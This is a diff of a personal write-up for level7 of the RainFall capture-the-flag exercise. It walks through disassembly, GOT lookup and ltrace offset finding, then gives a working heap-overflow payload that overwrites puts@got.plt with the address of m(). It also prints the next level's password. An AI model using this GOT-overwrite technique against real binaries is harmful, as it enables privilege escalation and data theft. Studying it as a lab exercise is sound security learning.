@@ -52,7 +52,7 @@ Non-debugging symbols:
 
 * Binary analysis
 
-** Code 
+** Functions 
 #+begin_src shell
   level7@RainFall:~$ gdb --batch -ex "file level7" -ex "set disassembly-flavor intel" -ex "disassemble main"
   Dump of assembler code for function main:
@@ -143,52 +143,83 @@ Non-debugging symbols:
   End of assembler dump.
 
 #+end_src
-
+** Code
 [[source]]
 
-* Estrategy
-May i need to call m() after read from file, i need to change  puts got to point m function.
-## for make this i need to write on GOT TABLE.
-i will use the heap overflow for mod the vaue of the GOT.
-### I need to access the where is save it
+** Explotation Estrategy
+I need to call m() after read from file, i need to change puts@got.plt to point m function.
+*** get GOT TABLE va.
+i will use the heap overflow for mod the value of ptr ~b[1] = b va + 4~ of the GOT.
 #+begin_src shell
-level7@RainFall:~$ objdump -R ./level7
-DYNAMIC RELOCATION RECORDS
-OFFSET   TYPE              VALUE 
-08049928 R_386_JUMP_SLOT   puts
+  level7@RainFall:~$ objdump -R ./level7
+  DYNAMIC RELOCATION RECORDS
+  OFFSET   TYPE              VALUE 
+  08049928 R_386_JUMP_SLOT   puts
+  #### GDB way
+  b main
+   r
+  x/3i puts
+     0x8048400 <puts@plt>:	jmp    *0x8049928
+     0x8048406 <puts@plt+6>:	push   $0x28
+     0x804840b <puts@plt+11>:	jmp    0x80483a0
+  (gdb) info symbol 0x8049928
+  puts@got.plt in section .got.plt
+  (gdb) x/wx 0x8049928
+  0x8049928 <puts@got.plt>:	0x08048406 # original value
+  (gdb) 
 #+end_src
 
 # change for this value
-###  and the value that i want to change with
+*** get m va
 #+begin_src shell
 (gdb) p m
 $1 = {<text variable, no debug info>} 0x80484f4 <m>
 0x080484f4
 #+end_src
-#let's use the strcpy to change the address point dst of the second strcpy.
-# https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+*** Get the offset
 #+begin_src shell
-level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
-strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x0804a018
-strcpy(0x37614136, NULL <unfinished ...> -> look like the address change it
-strcpy(0x0804a038, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x0804a038 -> this was the not overflow one.
-
+    level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+    strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x0804a018
+    strcpy(0x37614136, NULL <unfinished ...> -> look like the address change it
+    strcpy(0x0804a038, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x0804a038 -> this was the not overflow one.
+    ### let's noise way
+    #weird ltrace make segfault without do nothing bad but for get the offset work
+    level7@RainFall:~$ ./$USER a b
+  ~~
+  level7@RainFall:~$ ./$USER hola b
+  ~~
+  level7@RainFall:~$ ltrace ./$USER hola b
+  __libc_start_main(0x8048521, 3, 0xbffffd04, 0x8048610, 0x8048680 <unfinished ...>
+  malloc(8)                                                                                        = 0x0804a008
+  malloc(8)                                                                                        = 0x0804a018
+  malloc(8)                                                                                        = 0x0804a028
+  malloc(8)                                                                                        = 0x0804a038
+  strcpy(0x0804a018, "hola")                                                                       = 0x0804a018
+  strcpy(0x0804a038, "b")                                                                          = 0x0804a038
+  fopen("/home/user/level8/.pass", "r")                                                            = 0
+  fgets( <unfinished ...>
+  --- SIGSEGV (Segmentation fault) ---
+  +++ killed by SIGSEGV +++
+  p (0x0804a028 + 4) - 0x0804a018
+  20
 #+end_src
 ## the overflow offset is 20 bytes. address to put 08049928 -> tx little endian -> 28 99 04 08
-payload first argument will be "a" * 20 + \x28\x99\04\08
+*** Data Required
+#+begin_src shel
+m = 0x080484f4
+puts@got.plt = 08049928
+#+end_src
+*** Exploit Strategy
+payload first argument will be "a" * 20 + \x28\x99\04\08 -> puts@got.plt
+payload second argument will be m va
 #+begin_src shell
 level7@RainFall:~$ ltrace ./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') 
 strcpy(0x0804a018, "aaaaaaaaaaaaaaaaaaaa(\231\004\b") = 0x0804a018
 strcpy(0x08049928, NULL <unfinished ...> # The adderss is fine.
 #+end_src
-
-## Look like the payload is working fine
-#+begin_src shell
-
-#+end_src
-level7@RainFall:~$ 
-## write on tho got the address of m -> 0x80484f4 -> tx little endian \xf4\x84\x04\x08Do 
-because the open fail cause not change suid when ltrace, gdb ... couldn't with ltrace just launched.
+Verified the puts@got.plt is in b[1]
+because the open fail cause not change suid when ltrace, gdb ... couldn't test further with debuggers.
+* Exploit
 #+begin_src shell
 level7@RainFall:~$ ./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"')  $(printf '\xf4\x84\x04\x08')
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
@@ -196,23 +227,5 @@ level7@RainFall:~$ ./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"')  
 #+end_src
 ## the first line is the flag
 # flag/pass level8=5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
-level7@RainFall:~$ su level8
 Password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  
-#+begin_src shell
-level7@RainFall:~$ ltrace ./level7 a b # similar to gdb execute as level7 not level8
-__libc_start_main(0x8048521, 3, 0xbffffd04, 0x8048610, 0x8048680 <unfinished ...>
-malloc(8)                                             = 0x0804a008
-malloc(8)                                             = 0x0804a018
-malloc(8)                                             = 0x0804a028
-malloc(8)                                             = 0x0804a038
-strcpy(0x0804a018, "a")                               = 0x0804a018
-strcpy(0x0804a038, "b")                               = 0x0804a038
-fopen("/home/user/level8/.pass", "r")                 = 0
-fgets( <unfinished ...>
---- SIGSEGV (Segmentation fault) ---
-+++ killed by SIGSEGV +++
-
-#+end_src
-
-# let's see the functions
